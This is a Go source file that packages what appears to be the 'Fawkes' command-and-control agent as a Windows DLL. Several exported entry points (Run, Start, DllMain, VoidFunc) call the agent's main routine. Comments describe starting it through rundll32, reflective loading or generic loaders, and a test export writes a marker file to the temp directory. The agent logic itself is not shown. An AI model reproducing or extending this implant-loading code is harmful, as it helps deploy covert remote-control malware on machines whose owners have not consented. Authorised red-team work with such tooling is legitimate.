//go:build shared
// +build shared

package main

import "C"
import (
	"fmt"
	"log"
	"os"
	"path/filepath"
	"time"
)

// These exported functions are only compiled when building with -buildmode=c-shared
// They all call the main agent logic which handles initialization, checkin, and execution

func setupDllLogging() {
	// Create log file in temp directory for DLL debugging
	tempDir := os.TempDir()
	logPath := filepath.Join(tempDir, fmt.Sprintf("fawkes_%d.log", time.Now().Unix()))
	logFile, err := os.OpenFile(logPath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err == nil {
		log.SetOutput(logFile)
		log.Printf("[INFO] DLL logging initialized: %s", logPath)
	}
}

//export Run
func Run() {
	// Entry point for the DLL that can be called via rundll32 or reflective loading
	setupDllLogging()
	log.Printf("[INFO] DLL Run export called")
	runAgent()
}

//export Start
func Start() {
	// Alternative entry point name
	setupDllLogging()
	log.Printf("[INFO] DLL Start export called")
	runAgent()
}

//export DllMain
func DllMain() {
	// Windows DLL entry point that gets called on DLL_PROCESS_ATTACH
	// Note: This may have limitations with Go runtime initialization
	setupDllLogging()
	log.Printf("[INFO] DLL DllMain export called")
	runAgent()
}

//export VoidFunc
func VoidFunc() {
	// Generic export that some loaders expect
	setupDllLogging()
	log.Printf("[INFO] DLL VoidFunc export called")
	runAgent()
}

//export TestExport
func TestExport() {
	// Simple test export that just writes to a file to verify DLL loading
	tempDir := os.TempDir()
	testPath := filepath.Join(tempDir, "fawkes_test.txt")
	os.WriteFile(testPath, []byte(fmt.Sprintf("Fawkes DLL loaded successfully at %s\n", time.Now().String())), 0644)
}
